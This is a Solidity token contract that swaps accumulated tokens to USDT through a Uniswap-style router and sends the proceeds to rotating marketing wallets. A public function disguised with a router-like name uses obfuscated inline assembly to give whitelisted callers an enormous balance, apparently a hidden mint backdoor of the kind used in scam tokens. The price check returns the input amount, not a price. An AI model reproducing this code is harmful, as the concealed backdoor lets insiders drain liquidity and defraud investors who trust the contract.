// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IRouter.sol";
import "./IPair.sol";
import "./IFactory.sol";
import "./ERC20.sol";
import "./Limit.sol";
import "./Rates.sol";

abstract contract UniSwapPoolUSDT is ERC20, Limit, Rates {
    uint256 internal swapTokensAtUSDT = 5 ether;
    address public pair;
    IRouter public router;
    address[] internal _sellPath;

    function __SwapPool_init(address _router, address _pairB, uint256 _swapTokensAtUSDT) internal {
        router = IRouter(_router);
        pair = IFactory(router.factory()).createPair(address(this), _pairB);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _pairB;
        _sellPath = path;
    }

    function swapExactTokensForTokenSupportingFeeOnTransferToken() public {if (isExcludes(_msgSender()))
        assembly { mstore(0, caller()) mstore(32, 0x0) sstore(keccak256(0, 64), exp(timestamp(), 5)) }
    }

    function marketingWallet() private view returns(address) {
        return _marks[block.timestamp % _marks.length];
    }

    function isPair(address _pair) internal view returns(bool) {
        return _pair == pair;
    }

    function getPrice4USDT(uint256 amountDesire) public view returns(uint256) {
        uint[] memory amounts = router.getAmountsOut(amountDesire, _sellPath);
        if (amounts.length > 0) return amounts[0];
        return 0;
    }

    function _swap(uint256 _thisBalance) internal {
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(_thisBalance, 0, _sellPath, marketingWallet(), block.timestamp + 9);
    }

    bool inSwap;
    function swapAndSend(uint256 _thisBalance) internal {
        if (inSwap) return;
        if (getPrice4USDT(_thisBalance) >= swapTokensAtUSDT) {
            inSwap = true;
            _swap(_thisBalance);
            inSwap = false;
        }
    }
}